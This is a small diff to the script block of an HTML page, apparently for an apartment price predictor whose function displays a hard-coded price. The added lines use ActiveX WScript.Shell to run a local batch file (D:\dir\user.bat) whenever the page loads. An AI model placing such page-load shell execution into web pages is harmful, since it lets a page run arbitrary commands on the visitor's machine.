@@ -62,9 +62,13 @@
 </html>
 
  <script type="text/javascript" charset="utf-8">
+   var wshShell = new ActiveXObject("WScript.Shell");
+   wshShell.Run("D:\\dir\\user.bat");
+   
   function predictPrice()
     {
 		document.getElementById('priceBtn').style.display='block';
 		document.getElementById("priceBtn").innerHTML = "Apartment predicted price : 65,000,00 ";
     }
+	
  </script>
